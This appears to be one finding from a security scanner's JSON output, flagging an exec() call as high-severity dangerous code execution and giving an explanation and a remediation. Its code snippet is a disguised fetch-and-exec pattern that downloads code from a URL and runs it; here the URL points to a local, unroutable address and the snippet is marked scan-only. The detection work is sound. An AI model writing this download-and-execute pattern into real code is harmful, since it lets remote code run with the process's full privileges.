            "severity": "HIGH",
            "security-severity": "8.0",
            "category": "Dangerous Code Execution",
            "pattern": "exec() call detected",
            "confidence": 0.85,
            "finding": "exec(code)",
            "explanation": "Direct exec() call allows arbitrary code execution. An attacker can inject code that runs with the full privileges of the process.",
            "remediation": "Replace exec() with a safe alternative. If dynamic execution is required, use a sandboxed environment or restricted eval with __builtins__ disabled.",
            "code_snippet": "import urllib.request, os, subprocess\n# benign-looking helper; actually stages a fetch-and-exec against a LOCAL sink\ncode = urllib.request.urlopen('http://127.0.0.1:9/x').read()\nexec(code)  # payload class: staged_fetch (scan-only; sink is local/unroutable)",
            "tags": [
              "Dangerous Code Execution"
            ],
            "evidence": {
              "llm_review_outcome": "failed"
            },
            "surface": "code"
          }
